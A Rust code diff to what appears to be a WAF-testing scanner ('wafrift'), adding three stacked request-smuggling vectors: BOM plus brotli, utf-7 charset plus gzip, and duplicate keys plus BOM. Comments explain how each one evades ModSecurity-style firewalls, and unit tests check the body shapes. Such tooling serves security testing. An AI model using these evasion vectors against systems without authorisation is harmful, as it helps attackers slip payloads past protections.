@@ -161,6 +161,22 @@ pub const VECTORS: &[Vector] = &[
     // that iterate keys (route resolvers, dynamic-property setters,
     // logger field-name handlers) flow the attack into a sink.
     Vector { name: "POST-json-key-as-payload", content_type: "application/json" },
+    // ── Compound vectors ──────────────────────────────────────
+    // Stacked-axis attacks. Each defeats WAFs that handle one
+    // axis but not the AND of both. BOM-prefix + brotli body:
+    // a WAF that has brotli decompression still chokes on the
+    // BOM-prefixed JSON post-decompress; one without brotli
+    // never gets past the opaque-blob compressed body.
+    Vector { name: "POST-json-bom-br", content_type: "application/json" },
+    // utf-7 charset + gzip body. Backends fluent in gzip + lax on
+    // charset still process; WAFs that decompress gzip but skip
+    // utf-7 charsets stop at the gate.
+    Vector { name: "POST-json-utf7-gz", content_type: "application/json; charset=utf-7" },
+    // Dup-key + BOM. Two parse-confusions stacked. Last-occurrence
+    // backend reads the attack; first-occurrence WAF reads the
+    // benign FIRST value — but the BOM kicks in BEFORE that to
+    // make ModSec's JSON processor skip the whole body.
+    Vector { name: "POST-json-dupkey-bom", content_type: "application/json" },
     // text/xml — CRS xml-body rules anchor on `application/xml`
     // ONLY in many profiles; `text/xml` is an RFC-7303-permitted
     // alternate MIME most XML parsers (libxml2, Xerces, JAXB,
@@ -620,6 +636,59 @@ fn build_request_for_vector(
                 serde_json::Value::String(payload.to_string()),
                 p = param
             );
+            Some(http.post(target).header("Content-Type", ct).body(body))
+        }
+        "POST-json-bom-br" => {
+            // Compound: BOM-prefix JSON + brotli body. We prepend
+            // the 3-byte UTF-8 BOM to the JSON, then brotli-compress
+            // the whole thing.
+            let raw = serde_json::json!({ param: payload }).to_string();
+            let mut bom_prefixed = Vec::with_capacity(3 + raw.len());
+            bom_prefixed.extend_from_slice(&[0xEF, 0xBB, 0xBF]);
+            bom_prefixed.extend_from_slice(raw.as_bytes());
+            match compression::compress(&bom_prefixed, CompressionAlgo::Brotli) {
+                Ok(blob) => Some(
+                    http.post(target)
+                        .header("Content-Type", ct)
+                        .header("Content-Encoding", blob.content_encoding)
+                        .body(blob.body),
+                ),
+                Err(e) => {
+                    eprintln!("[wafrift scan] compound bom+br skipped: {e}");
+                    None
+                }
+            }
+        }
+        "POST-json-utf7-gz" => {
+            // Compound: utf-7 charset + gzip body. Body stays
+            // UTF-8 JSON bytes; the charset declaration on the
+            // outer Content-Type kicks the WAF off the body
+            // path; gzip catches any WAF that ignores charset.
+            let raw = serde_json::json!({ param: payload }).to_string();
+            match compression::compress(raw.as_bytes(), CompressionAlgo::Gzip) {
+                Ok(blob) => Some(
+                    http.post(target)
+                        .header("Content-Type", ct)
+                        .header("Content-Encoding", blob.content_encoding)
+                        .body(blob.body),
+                ),
+                Err(e) => {
+                    eprintln!("[wafrift scan] compound utf7+gz skipped: {e}");
+                    None
+                }
+            }
+        }
+        "POST-json-dupkey-bom" => {
+            // Compound: dup-key + BOM prefix. Two parse-confusion
+            // axes stacked.
+            let raw = format!(
+                "{{\"{p}\":\"x\",\"{p}\":{v}}}",
+                p = param,
+                v = serde_json::Value::String(payload.to_string())
+            );
+            let mut body = Vec::with_capacity(3 + raw.len());
+            body.extend_from_slice(&[0xEF, 0xBB, 0xBF]);
+            body.extend_from_slice(raw.as_bytes());
             Some(http.post(target).header("Content-Type", ct).body(body))
         }
         "POST-text-xml" => {
@@ -3498,6 +3567,126 @@ mod tests {
     fn round_seven_vectors_are_in_catalogue() {
         let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
         for required in ["origin", "range", "from"] {
+            assert!(names.contains(required), "missing vector {required}");
+        }
+    }
+
+    // ── Compound vectors ──────────────────────────────────────
+
+    #[test]
+    fn build_post_json_bom_br_emits_brotli_content_encoding() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-bom-br").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-encoding").unwrap(), "br");
+    }
+
+    #[test]
+    fn build_post_json_bom_br_round_trip_recovers_bom_prefixed_json() {
+        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-bom-br").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "PAYLOAD", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let recovered = decompress(&CompressedBody {
+            body: body.to_vec(),
+            content_encoding: Algorithm::Brotli.content_encoding().to_string(),
+        })
+        .expect("brotli round-trip");
+        // First three bytes MUST be the BOM.
+        assert_eq!(&recovered[..3], &[0xEF, 0xBB, 0xBF]);
+        // Rest must be valid JSON with the payload.
+        let s = std::str::from_utf8(&recovered[3..]).unwrap();
+        let v: serde_json::Value = serde_json::from_str(s).unwrap();
+        assert_eq!(v["q"], "PAYLOAD");
+    }
+
+    #[test]
+    fn build_post_json_utf7_gz_declares_utf7_charset_and_gzip_encoding() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-utf7-gz").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
+        assert!(ct.contains("charset=utf-7"));
+        assert_eq!(req.headers().get("content-encoding").unwrap(), "gzip");
+    }
+
+    #[test]
+    fn build_post_json_utf7_gz_round_trip_recovers_json() {
+        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-utf7-gz").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let recovered = decompress(&CompressedBody {
+            body: body.to_vec(),
+            content_encoding: Algorithm::Gzip.content_encoding().to_string(),
+        })
+        .unwrap();
+        let s = String::from_utf8(recovered).unwrap();
+        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
+        assert_eq!(v["q"], "abc");
+    }
+
+    #[test]
+    fn build_post_json_dupkey_bom_starts_with_bom_then_dupkey_shape() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-dupkey-bom").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        assert_eq!(&body[..3], &[0xEF, 0xBB, 0xBF]);
+        let s = std::str::from_utf8(&body[3..]).unwrap();
+        assert_eq!(s.matches("\"q\":").count(), 2, "must emit q twice: {s}");
+        // Benign first, attack second — same as plain dupkey.
+        let first_pos = s.find("\"q\":").unwrap();
+        let second_pos = s.rfind("\"q\":").unwrap();
+        assert!(first_pos < second_pos);
+        let after_second = &s[second_pos..];
+        assert!(after_second.contains("attack"));
+    }
+
+    #[test]
+    fn build_post_json_dupkey_bom_body_after_bom_parses_as_json() {
+        // Strip the BOM, the remaining bytes are valid JSON with
+        // two q keys — serde_json takes the LAST one.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-dupkey-bom").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(&body[3..]).unwrap();
+        let v: serde_json::Value = serde_json::from_str(s).expect("post-BOM body must parse");
+        // serde_json default is last-occurrence-wins, so q = attack.
+        assert_eq!(v["q"], "attack");
+    }
+
+    // ── compound catalogue ────────────────────────────────────
+
+    #[test]
+    fn compound_vectors_are_in_catalogue() {
+        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
+        for required in [
+            "POST-json-bom-br",
+            "POST-json-utf7-gz",
+            "POST-json-dupkey-bom",
+        ] {
             assert!(names.contains(required), "missing vector {required}");
         }
     }
